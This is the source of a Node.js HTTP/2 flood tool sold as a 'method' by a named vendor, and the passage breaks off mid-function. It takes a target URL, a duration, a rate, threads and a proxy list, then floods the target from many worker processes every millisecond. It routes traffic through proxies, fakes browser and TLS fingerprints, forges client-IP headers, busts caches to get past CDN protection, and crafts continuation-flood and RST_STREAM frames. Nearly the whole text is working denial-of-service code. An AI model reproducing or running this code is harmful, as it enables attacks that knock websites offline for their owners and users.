//Method By STEVEN•STORE🕊🪽
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
var colors = require("colors");
const v8 = require("v8");
const { exec } = require("child_process");
const HPACK = require('hpack');
const os = require('os');

// HTTP/2 constants for frame types from IANA
const HTTP2_FRAME_TYPES = {
  DATA: 0x00,
  HEADERS: 0x01,
  PRIORITY: 0x02,
  RST_STREAM: 0x03,
  SETTINGS: 0x04,
  PUSH_PROMISE: 0x05,
  PING: 0x06,
  GOAWAY: 0x07,
  WINDOW_UPDATE: 0x08,
  CONTINUATION: 0x09
};

// HTTP/2 Frame Flags
const HTTP2_FLAGS = {
  END_STREAM: 0x01,
  END_HEADERS: 0x04,
  PADDED: 0x08,
  PRIORITY: 0x20
};

// HTTP/2 settings parameters
const HTTP2_SETTINGS = {
  HEADER_TABLE_SIZE: 0x01,
  ENABLE_PUSH: 0x02,
  MAX_CONCURRENT_STREAMS: 0x03,
  INITIAL_WINDOW_SIZE: 0x04,
  MAX_FRAME_SIZE: 0x05,
  MAX_HEADER_LIST_SIZE: 0x06
};

// Various attack strategies
const ATTACK_STRATEGIES = {
  STANDARD: "standard",
  CLOUDFLARE: "cloudflare",
  AKAMAI: "akamai",
  FASTLY: "fastly",
  MIXED: "mixed",
  CONTINUATION_FLOOD: "continuation_flood"
};

// Enhanced browser profiles for more realistic requests
const BROWSER_PROFILES = {
    chrome: {
        name: 'Chrome',
        version: { min: 136, max: 136 },
        secChUA: [
            { brand: "Chromium", version: "136" },
            { brand: "Google Chrome", version: "136" },
            { brand: "Not:A-Brand", version: "99" }
        ],
        platform: "Win64",
        mobile: "?0",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        acceptHeader: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        acceptLanguage: "en-US,en;q=0.9",
        acceptEncoding: "gzip, deflate, br",
        secFetch: {
            dest: "document",
            mode: "navigate",
            site: "none",
            user: "?1"
        }
    },
    firefox: {
        name: 'Firefox',
        version: { min: 118, max: 118 },
        secChUA: [
            { brand: "Firefox", version: "118.0" },
            { brand: "Gecko", version: "20100101" }
        ],
        platform: "Win64",
        mobile: "?0",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        acceptHeader: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        acceptLanguage: "en-US,en;q=0.5",
        acceptEncoding: "gzip, deflate, br",
        secFetch: {
            dest: "document",
            mode: "navigate",
            site: "cross-site",
            user: "?1"
        }
    },
    ios: {
        name: 'iOS',
        version: { min: 17, max: 17 },
        secChUA: [
            { brand: "Firefox", version: "138" },
            { brand: "iOS", version: "17" }
        ],
        platform: "iOS",
        mobile: "?1",
        userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/138.0 Mobile/15E148 Safari/605.1.15",
        acceptHeader: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        acceptLanguage: "en-US,en;q=0.9,fr;q=0.8,ja;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        acceptEncoding: "gzip, deflate, br",
        secFetch: {
            dest: "document",
            mode: "navigate",
            site: "same-origin",
            user: "?1"
        }
    }
};

// More realistic Accept headers
const ENHANCED_ACCEPT_HEADERS = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

// Language headers with weights for more realism
const LANGUAGE_HEADERS = [
    "en-US,en;q=0.9", 
    "id-ID,id;q=0.9", 
    "fr-FR,fr;q=0.8", 
    "es-ES,es;q=0.7", 
    "de-DE,de;q=0.9", 
    "ja-JP,ja;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8,ja;q=0.7,zh-CN;q=0.6,zh;q=0.5"
];

// Encoding options
const ENCODING_HEADERS = [
    "gzip, deflate, br", 
    "gzip, deflate, zstd, br", 
    "gzip, br, deflate", 
    "br, gzip, zstd"
];

// Constants for HTTP/2 frame operations
const HTTP2_FRAME_SIZE = 9;
const FRAME_TYPE_SETTINGS = 0x4;
const FRAME_TYPE_HEADERS = 0x1;
const FRAME_TYPE_RST_STREAM = 0x3;
const FLAGS_NONE = 0x0;
const FLAGS_END_STREAM = 0x1;
const FLAGS_END_HEADERS = 0x4;
const STREAM_ID_ZERO = 0x0;
const RST_STREAM_CANCEL = 0x8;

// Settings identifiers
const SETTINGS_HEADER_TABLE_SIZE = 0x1;
const SETTINGS_MAX_CONCURRENT_STREAMS = 0x3;
const SETTINGS_INITIAL_WINDOW_SIZE = 0x4;
const SETTINGS_MAX_HEADER_LIST_SIZE = 0x6;

// Function for creating random string
function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }

if (process.argv.length < 6) {
  console.log('node target time rate thread proxy');
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function getRandomValue(array) {
    return array[Math.floor(Math.random() * array.length)];
}
          
          function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

          const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };

const sigalgs = [
       'ecdsa_secp256r1_sha256',
       'ecdsa_secp384r1_sha384',
       'ecdsa_secp521r1_sha512',
       'rsa_pss_rsae_sha256',
       'rsa_pss_rsae_sha384',
       'rsa_pss_rsae_sha512',
       'rsa_pkcs1_sha256',
       'rsa_pkcs1_sha384',
       'rsa_pkcs1_sha512',
]; 

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();

// Parse --cache true flag
const cacheBypassFlag = process.argv.includes('--cache') && process.argv.includes('true');
// Parse --rushaway true flag
const rushAway = process.argv.includes('--rushaway') && process.argv.includes('true');
// Parse --http 1/2/mix flag
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? (process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1])) : "2";

// Track which mode messages have been logged
const loggedModes = new Set();

if (cluster.isMaster) {
    // Define RAM monitoring constants
    const MAX_RAM_PERCENTAGE = 95;
    const RESTART_DELAY = 1000;
    
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        //console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            //console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    // Monitor RAM usage every 5 seconds
    setInterval(handleRAMUsage, 5000);
    
    // Also keep the TCP settings adjustment functionality
    setInterval(TCP_CHANGES_SERVER, 30000);
    
    // Start the initial worker processes
   for (let counter = 1; counter <= args.threads; counter++) {
     console.clear();
     console.log('Target: ' + process.argv[2]);
     console.log('Time: ' + process.argv[3]);
     console.log('Rate: ' + process.argv[4]);
     console.log('Thread(s): ' + process.argv[5]);
 console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
     console.log(`TCP Settings: Auto-Optimizing (if supported)`);
       cluster.fork();
   }
} else {
    // Worker process code
  for (let i = 0; i < 10; i++) { 
    setInterval(runFlooder, 1); 
  }
  
    // Keep the TCP settings adjustment for worker processes
  TCP_CHANGES_SERVER();
}

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });
}
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
  }

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

 function randomElement(elements) {
    return elements[randomIntn(0, elements.length - 1)];
}

// Use the randstr function declared above.

// Includes all HTTP/2 settings to suit every goal.
function getHttp2Settings() {
    // Set the default to be fairly aggressive.
    const baseSettings = {
        [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
        [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 1000,
        [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 6291456 * 2, // Doubled
        [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 524288, // Use the highest value ever set by Akamai.
        [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384 * 2, // Doubled
        [HTTP2_SETTINGS.ENABLE_PUSH]: 0
    };
    
    // Randomly adjust some values for variety.
    if (Math.random() > 0.5) {
        baseSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = Math.max(
            6291456, 
            Math.floor(baseSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] * (0.8 + Math.random() * 0.6))
        );
    }
    
    // Convert to format expected by http2.connect
    return {
        headerTableSize: baseSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
        maxConcurrentStreams: baseSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        initialWindowSize: baseSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE],
        maxHeaderListSize: baseSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
        maxFrameSize: baseSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE],
        enablePush: baseSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1
    };
}

// Combine all path creation to suit every goal.
function getTargetPath(_, host, basePath) {
    let path = basePath || '/';
    if (cacheBypassFlag) {
        // Aggressive cache-busting path modifications
        const timestamp = Date.now();
        const microtime = process.hrtime.bigint().toString();
        const pathModifiers = [
            `${timestamp}-${randstr(8)}`,
            `v${getRandomInt(1,999)}.${getRandomInt(1,99)}`,
            `${randstr(4)}_${timestamp}`,
            `cache_${microtime.slice(-8)}`,
            `bust-${crypto.randomBytes(4).toString('hex')}`,
            `t${timestamp}r${getRandomInt(1000,9999)}`
        ];
        const selectedModifier = pathModifiers[Math.floor(Math.random() * pathModifiers.length)];
        path += (path.endsWith('/') ? '' : '/') + selectedModifier;
        if (Math.random() < 0.6) {
            path += '/' + randstr(getRandomInt(3,7));
        }
    }
    // Add cache-busting query params if enabled
    let query = '';
    if (cacheBypassFlag) {
        const timestamp = Date.now();
        const microtime = process.hrtime.bigint().toString();
        const cacheBreakers = [
            `_cb=${timestamp}${randstr(3)}`,
            `_t=${timestamp}`,
            `_r=${crypto.randomBytes(6).toString('hex')}`,
            `_v=${getRandomInt(100000,999999)}`,
            `_bust=${microtime.slice(-10)}`,
            `_nocache=${randstr(8)}`,
            `_ts=${Math.floor(timestamp/1000)}${randstr(3)}`,
            `_uid=${crypto.randomUUID().replace(/-/g, '').slice(0,12)}`,
            `_hash=${crypto.createHash('md5').update(timestamp.toString()).digest('hex').slice(0,8)}`,
            `_rnd=${Math.random().toString(36).slice(2,12)}`
        ];
        const numParams = getRandomInt(2, 4);
        const shuffled = [...cacheBreakers].sort(() => Math.random() - 0.5);
        for (let i = 0; i < numParams; i++) {
            query += (i === 0 ? '?' : '&') + shuffled[i];
        }
        if (Math.random() < 0.4) query += `&cf_cache_bust=${timestamp}`;
        if (Math.random() < 0.3) query += `&akamai_bypass=${randstr(6)}`;
        if (Math.random() < 0.3) query += `&aws_nocache=${microtime.slice(-8)}`;
    } else if (Math.random() > 0.5) {
        query += '?' + randstr(7) + '=' + randstr(15);
    }
    return path + query;
}

// Improved the sendRandomFrames function to check connection status and reduce duplicate sending.
function sendRandomFrames(client, streamId, rate) {
    // Check if the client is available.
    if (!client || client.destroyed) return;

    // Reduce the number of frames sent to reduce the chance of problems.
    const safeRate = Math.min(rate, 10); // Maximum quantity is limited to 10.
    
    // Create a list of frames to send instead of sending them immediately.
    const framesToSend = [];
    
    for (let i = 0; i < safeRate; i++) {
        // Random frame type to send
        const frameTypes = [
            HTTP2_FRAME_TYPES.WINDOW_UPDATE,
            HTTP2_FRAME_TYPES.PING,
            HTTP2_FRAME_TYPES.PRIORITY
        ];
        
        // Choose only safer frames
        const frameType = frameTypes[Math.floor(Math.random() * frameTypes.length)];
        
        // Prepare frame data by type
        if (frameType === HTTP2_FRAME_TYPES.WINDOW_UPDATE) {
            // Prepare data WINDOW_UPDATE
            const windowSizeIncrement = Math.floor(Math.random() * 2147483647) + 1;
            framesToSend.push({
                type: frameType,
                data: windowSizeIncrement,
                id: streamId
            });
        } else if (frameType === HTTP2_FRAME_TYPES.PING) {
            // Prepare data PING
            const pingData = Buffer.from(randstr(8));
            framesToSend.push({
                type: 'ping',
                data: pingData
            });
        } else if (frameType === HTTP2_FRAME_TYPES.PRIORITY) {
            // Do not pass PRIORITY frames directly, as this can cause issues.
            // Instead, use client.priority() if available.
            if (client.priority && typeof client.priority === 'function') {
                framesToSend.push({
                    type: 'priority',
                    id: streamId,
                    priority: {
                        exclusive: Math.random() > 0.5,
                        parent: Math.floor(Math.random() * 256),
                        weight: Math.floor(Math.random() * 256)
                    }
                });
            }
        }
    }
    
    // Deliver prepared frames with some spacing to reduce resource contention.
    let delayIndex = 0;
    for (const frame of framesToSend) {
        setTimeout(() => {
            try {
                if (!client || client.destroyed) return;
                
                if (frame.type === HTTP2_FRAME_TYPES.WINDOW_UPDATE) {
                    client.send(frame.type, frame.data, frame.id);
                } else if (frame.type === 'ping') {
                    client.ping(frame.data, () => {});
                } else if (frame.type === 'priority' && client.priority) {
                    client.priority(frame.id, frame.priority);
                }
            } catch (e) {
                // Silent error handling
            }
        }, delayIndex * 5); // Increase the distance between each frame transmission.
        delayIndex++;
    }
}

// Function to generate more realistic headers based on browser profile
function generateBrowserHeaders(browser, parsedTarget) {
    // Get random profile or use specified one
    const profile = typeof browser === 'string' ? 
        BROWSER_PROFILES[browser] || BROWSER_PROFILES.chrome :
        randomElement(Object.values(BROWSER_PROFILES));
    
    // Format sec-ch-ua header from profile
    const secChUA = profile.secChUA
        .map(b => `"${b.brand}";v="${b.version}"`)
        .join(", ");
    
    // Create base headers
    const headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path,
        
        "user-agent": profile.userAgent,
        "accept": randomElement(ENHANCED_ACCEPT_HEADERS),
        "accept-language": randomElement(LANGUAGE_HEADERS),
        "accept-encoding": randomElement(ENCODING_HEADERS),
        
        "sec-ch-ua": secChUA,
        "sec-ch-ua-mobile": profile.mobile,
        "sec-ch-ua-platform": `"${profile.platform}"`,
        
        "sec-fetch-dest": profile.secFetch.dest,
        "sec-fetch-mode": profile.secFetch.mode,
        "sec-fetch-site": profile.secFetch.site,
        "sec-fetch-user": profile.secFetch.user,
        
        "upgrade-insecure-requests": "1",
        "te": "trailers"
    };
    
    // Add random cache control
    if (Math.random() < 0.7 && !cacheBypassFlag) {
        headers["cache-control"] = randomElement([
            "max-age=0",
            "no-cache",
            "no-store, no-cache, must-revalidate",
            "no-cache, no-store, must-revalidate, max-age=0"
        ]);
    }
    
    // Add pragma for additional cache control
    if (Math.random() < 0.5) {
        headers["pragma"] = "no-cache";
    }
    
    // Add referrer (50% chance of target URL, 50% chance of no referrer)
    if (Math.random() < 0.5) {
        headers["referer"] = "https://" + parsedTarget.host + "/";
    }
    
    // Add origin (only from target domain)
    if (Math.random() < 0.4) {
        headers["origin"] = "https://" + parsedTarget.host;
    }
    
    // Add random priority hint
    if (Math.random() < 0.3) {
        headers["priority"] = randomElement(["u=1, i", "u=0, i"]);
    }
    
    // Add unique request ID
    if (Math.random() < 0.2) {
        headers["x-request-id"] = randstr(32);
    }
    
    // Add alternative IP headers to make request look legitimate
    addAlternativeIPHeaders(headers);
    
    if (cacheBypassFlag) {
        const timestamp = Date.now();
        const microtime = process.hrtime.bigint().toString();
        headers["cache-control"] = "no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, proxy-revalidate, private";
        headers["pragma"] = "no-cache";
        headers["expires"] = "-1";
        headers["x-cache-buster"] = randstr(10);
        headers["x-forwarded-for"] = `${getRandomInt(1,255)}.${getRandomInt(0,255)}.${getRandomInt(0,255)}.${getRandomInt(1,255)}`;
        headers["x-cache-bypass"] = timestamp.toString();
        headers["x-no-cache"] = randstr(8);
        headers["x-bust-cache"] = microtime.slice(-10);
        headers["if-modified-since"] = "Thu, 01 Jan 1970 00:00:00 GMT";
        headers["if-none-match"] = `"${randstr(16)}"`;
        if (Math.random() < 0.5) {
            headers["cf-cache-status"] = "BYPASS";
            headers["cf-ray"] = `${randstr(8)}-${["SJC","LAX","DFW","ORD","IAD","LHR","FRA","NRT"][Math.floor(Math.random()*8)]}`;
        }
        if (Math.random() < 0.4) {
            headers["x-akamai-edgescape"] = randstr(10);
            headers["akamai-origin-hop"] = getRandomInt(1,5).toString();
        }
        if (Math.random() < 0.3) {
            headers["x-aws-cf-id"] = randstr(20);
            headers["x-edge-location"] = ["us-east-1","eu-west-1","ap-southeast-1"][Math.floor(Math.random()*3)];
        }
        if (Math.random() < 0.6) {
            headers["x-real-ip"] = `${getRandomInt(1,255)}.${getRandomInt(0,255)}.${getRandomInt(0,255)}.${getRandomInt(1,255)}`;
            headers["x-originating-ip"] = `${getRandomInt(1,255)}.${getRandomInt(0,255)}.${getRandomInt(0,255)}.${getRandomInt(1,255)}`;
            headers["x-client-ip"] = `${getRandomInt(1,255)}.${getRandomInt(0,255)}.${getRandomInt(0,255)}.${getRandomInt(1,255)}`;
        }
        headers["vary"] = "user-agent, accept-encoding, accept-language, x-requested-with";
        headers["x-browser-cache-buster"] = crypto.randomUUID();
        headers["x-timestamp"] = timestamp.toString();
        headers["x-random-id"] = crypto.randomBytes(8).toString('hex');
        if (Math.random() < 0.4) {
            headers["x-bypass-cache"] = "true";
            headers["x-force-refresh"] = "1";
            headers["x-cache-control-override"] = "no-cache";
        }
    }
    
    return headers;
}

// Function to add alternative IP headers that are less likely to be detected
function addAlternativeIPHeaders(headers) {
    // Use probability to randomly include some but not all headers
    if (Math.random() < 0.4) headers["cdn-loop"] = `cloudflare;ip=${generateLegitIP()}:${randstra(5)}`;
    if (Math.random() < 0.3) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.4) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.3) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    
    // Include at least one header if all randomization failed
    if (!headers["cdn-loop"] && !headers["true-client-ip"] && !headers["via"] && !headers["request-context"]) {
        headers["cdn-loop"] = `cloudflare;ip=${generateLegitIP()}:${randstra(5)}`;
    }
}

// Function to generate realistic IP addresses from known ASNs
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", ip: "8.8.8." },
        { asn: "AS8075", ip: "13.107.21." },
        { asn: "AS14061", ip: "104.18.32." },
        { asn: "AS13335", ip: "162.158.78." },
        { asn: "AS16509", ip: "3.120.0." }
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

// Function to get HTTP/2 settings based on browser
function getBrowserHTTP2Settings(browser) {
    const baseSettings = {
        [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
        [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
        [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 1000,
        [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 6291456,
        [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 262144,
        [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384
    };
    
    // Apply browser-specific settings
    if (browser === 'chrome') {
        return {
            headerTableSize: baseSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
            enablePush: baseSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1,
            maxConcurrentStreams: baseSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
            initialWindowSize: 6291456,
            maxHeaderListSize: baseSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
            maxFrameSize: 16384
        };
    } else if (browser === 'firefox') {
        return {
            headerTableSize: baseSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
            enablePush: baseSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1,
            maxConcurrentStreams: 128,
            initialWindowSize: 131072,
            maxHeaderListSize: 65536,
            maxFrameSize: baseSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE]
        };
    } else if (browser === 'ios') {
        return {
            headerTableSize: baseSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
            enablePush: baseSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1,
            maxConcurrentStreams: 100,
            initialWindowSize: 2097152,
            maxHeaderListSize: baseSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
            maxFrameSize: baseSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE]
        };
    }
    
    // Convert to format expected by http2.connect
    return {
        headerTableSize: baseSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
        enablePush: baseSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1,
        maxConcurrentStreams: baseSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        initialWindowSize: baseSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE],
        maxHeaderListSize: baseSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
        maxFrameSize: baseSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE]
    };
}

// Improved the sendContinuationFlood function to not use the internal API directly.
function sendContinuationFlood(client, streamId, count = 50, browserType = 'chrome') {
    // Check if the client is available.
    if (!client || client.destroyed) return;
    
    try {
        // Limit the number of frames to be sent to reduce the chance of problems.
        const safeCount = Math.min(count, 20);
        
        // Create requests with fairly large headers.
        const largeHeaders = {};
        const browserProfile = BROWSER_PROFILES[browserType] || BROWSER_PROFILES.chrome;
        
        // Use headers from browser profile
        largeHeaders["user-agent"] = browserProfile.userAgent;
        largeHeaders["accept"] = browserProfile.acceptHeader || ENHANCED_ACCEPT_HEADERS[0];
        largeHeaders["accept-language"] = browserProfile.acceptLanguage;
        largeHeaders["accept-encoding"] = "gzip, deflate, br";
        
        // Add custom headers to make the header block size larger.
        for (let i = 0; i < 5; i++) {
            largeHeaders[`x-custom-header-${i}`] = randstr(Math.floor(Math.random() * 256) + 64);
        }
        
        // Create requests with large headers
        const request = client.request(largeHeaders, { endStream: false });
        
        // Send DATA frames to generate more traffic.
        for (let i = 0; i < safeCount; i++) {
            setTimeout(() => {
                try {
                    if (request.destroyed) return;
                    
                    // Send DATA frame
                    const data = Buffer.from(randstr(Math.floor(Math.random() * 1024) + 256));
                    request.write(data);
                    
                    // If it is the last frame, close the request.
                    if (i === safeCount - 1) {
                        request.end();
                    }
                } catch (e) {
                    // Silent error handling
                }
            }, i * 10); // Send each frame 10ms apart.
        }
    } catch (error) {
        // Silent error handling
    }
}

// Use all attack modes regardless of target type.
function getAttackStrategy() {
    // Randomize strategies from all available.
    const strategies = [
        ATTACK_STRATEGIES.STANDARD,
        ATTACK_STRATEGIES.CLOUDFLARE,
        ATTACK_STRATEGIES.AKAMAI,
        ATTACK_STRATEGIES.FASTLY,
        ATTACK_STRATEGIES.MIXED,
        ATTACK_STRATEGIES.CONTINUATION_FLOOD
    ];
    
    // Randomly select one strategy
    return randomElement(strategies);
}

// Function for creating HTTP/2 frames directly
function createSettingsEntry(identifier, value) {
    const entryBuffer = Buffer.alloc(6);
    entryBuffer.writeUInt16BE(identifier, 0);
    entryBuffer.writeUInt32BE(value, 2);
    return entryBuffer;
}

function createSettingsFrame() {
    const settings = [
        createSettingsEntry(SETTINGS_HEADER_TABLE_SIZE, 65536),
        createSettingsEntry(SETTINGS_MAX_CONCURRENT_STREAMS, 100),
        createSettingsEntry(SETTINGS_INITIAL_WINDOW_SIZE, 6291456),
        createSettingsEntry(SETTINGS_MAX_HEADER_LIST_SIZE, 262144),
    ];

    const settingsPayload = Buffer.concat(settings);

    const length = Buffer.alloc(3);
    length.writeUIntBE(settingsPayload.length, 0, 3);

    const type = Buffer.alloc(1, FRAME_TYPE_SETTINGS);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamId = Buffer.alloc(4);
    streamId.writeUInt32BE(STREAM_ID_ZERO);

    return Buffer.concat([length, type, flags, streamId, settingsPayload]);
}

function createWindowUpdateFrame(streamId, windowSize) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
    const type = Buffer.alloc(1, HTTP2_FRAME_TYPES.WINDOW_UPDATE);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const windowSizeBuffer = Buffer.alloc(4);
    windowSizeBuffer.writeUInt32BE(windowSize, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, windowSizeBuffer]);
}

function createHeadersFrame(streamId, headers, codec) {
    const packedHeaders = codec.encode(headers);
    const length = packedHeaders.length;
    const type = FRAME_TYPE_HEADERS;
    const flags = FLAGS_END_HEADERS | FLAGS_END_STREAM;
    const header = Buffer.alloc(HTTP2_FRAME_SIZE);

    header.writeUInt32BE((length << 8) | type, 0);
    header.writeUInt8(flags, 4);
    header.writeUInt32BE(streamId, 5);

    return Buffer.concat([header, packedHeaders]);
}

function createRST_STREAM(streamId, errorCode) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
